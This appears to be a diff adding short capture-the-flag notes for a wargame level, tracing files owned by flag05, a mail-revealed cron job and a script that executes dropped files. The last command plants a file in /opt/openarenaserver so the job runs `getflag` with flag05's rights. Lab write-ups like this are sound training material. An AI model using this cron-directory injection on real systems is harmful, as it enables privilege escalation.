@@ -1,0 +1,12 @@
+Ran `find / -user flag05` and found openarenaserver files
+`/usr/sbin/openarenaserver`
+Looks like the same sort of string exploitation as the last level
+I have mail for some reason?
+`less /var/spool/mail/level05`
+`*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`
+Cron job?
+`*/2` means it runs every 2 minutes
+`/usr/sbin/openarenaserver` script being run with flag05's permissions
+`bash -x "$1"` is running the contents of the file as a bash script
+`echo 'getflag > /tmp/flag' > /opt/openarenaserver/file`
+This is run with flag05's permissions producing the `/tmp/flag` file containing the output of `getflag`
